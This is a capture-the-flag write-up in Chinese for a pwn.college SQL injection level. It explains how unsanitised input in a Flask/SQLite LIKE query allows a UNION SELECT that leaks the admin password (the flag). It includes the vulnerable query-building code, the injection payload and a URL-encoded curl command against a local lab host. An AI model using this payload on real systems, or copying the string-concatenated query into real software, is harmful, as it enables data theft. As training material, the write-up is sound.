# SQLi3

## 題目目標：

> *If you recall, your command injection exploits typically caused additional commands to be executed. So far, your SQL injections have simply modified the conditions of existing SQL queries. However, similar to how the shell has ways to chain commands (e.g., ;, |, etc), some SQL queries can be chained as well!
An attacker's ability to chain SQL queries has extremely powerful potential. For example, it allows the attacker to query completely unintended tables or completely unintended fields in tables, and leads to the types of massive data disclosures that you read about on the news.
This level will require you to figure out how to chain SQL queries in order to leak data. Good luck!*


從資料庫中讀取 /flag 的內容

## 程式碼分析：

伺服器建立了一個 SQLite 資料庫並創建一個 users 資料表:

`db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])`


也就是說，flag 被當作 `admin` 使用者的密碼存入了 `users` 表中

接著:

```Python
query = flask.request.args.get("query", "%")
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

這一段是注入點，使用者可以控制 query，而它直接拼接進 SQL 字串中。

例如：

```SQL
SELECT username FROM users WHERE username LIKE "%<input>"
```

這會產生 SQL Injection 弱點

解法分析：

我們使用 UNION SELECT 注入額外的查詢語句，目的是讓原本回傳 username 的結果，後面加上一筆我們自己查詢的密碼欄位（其實就是 flag）

```SQL
SELECT username FROM users WHERE username LIKE "%"
UNION SELECT password FROM users WHERE username='admin'--"
```

`--` 是 SQL 的註解符號，後面的 " 會被忽略。

整體就讓 SQL 執行我們額外的 SELECT password 查詢，並把結果加到畫面上。

實際使用的指令：

```SHELL
curl "http://challenge.localhost:80/?query=%25%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27--"
```

這是URL-encoded的版本，解碼後是:

```SQL
%" UNION SELECT password FROM users WHERE username='admin'--
```

這會讓SQL執行以下查詢：

```SQL
SELECT username FROM users WHERE username LIKE "%"
UNION SELECT password FROM users WHERE username='admin'
```


## 結果：

網頁會顯示三筆結果：

1. admin
2. guest
3. pwn.college{...FLAG...}


這樣我們就成功取得flag